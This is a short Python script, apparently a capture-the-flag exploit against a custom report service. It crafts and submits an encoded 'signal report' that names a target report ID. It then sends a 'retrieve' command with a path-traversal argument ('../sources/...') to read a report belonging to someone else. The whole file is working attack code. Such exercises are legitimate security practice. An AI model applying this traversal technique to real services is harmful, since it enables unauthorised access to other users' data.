import logging

from shared import encode_signal_data, make_conn, randstr

# CHANGE THIS
TARGET_REPORT = "fK5xC8piqa4G2aoVW.jkGrffm.YTg_Yl"


c, user, password = make_conn()
rand = randstr(10)
report = f"""%Interference%
FuO9wPCTixKYtHgQt5e4x4poDHSPbNCo$Ship "Foxtrot Uniform Oscar"
%Signals%
!0!uL7A Cm.NA/2:UmFuZG9tIGRhdGEuLi4=
!1!{rand} {TARGET_REPORT}:UmFuZG9tIGRhdGEuLi4=
%End%
"""

c.send_line(f"report {encode_signal_data(report.encode(), b'x').hex()}")
logging.info("Sent report")

c.recv_until("Key=")
key = c.recv_until(" ").decode()
c.recv_until("ID=")
id = c.recv_line().decode()
logging.info("Received report info (%s:%s)", id, key)

c.send_line(f"retrieve {id} ../sources/{rand} {TARGET_REPORT}")
report = c.recv_until("=== Report end ===", False).decode()
print(report)
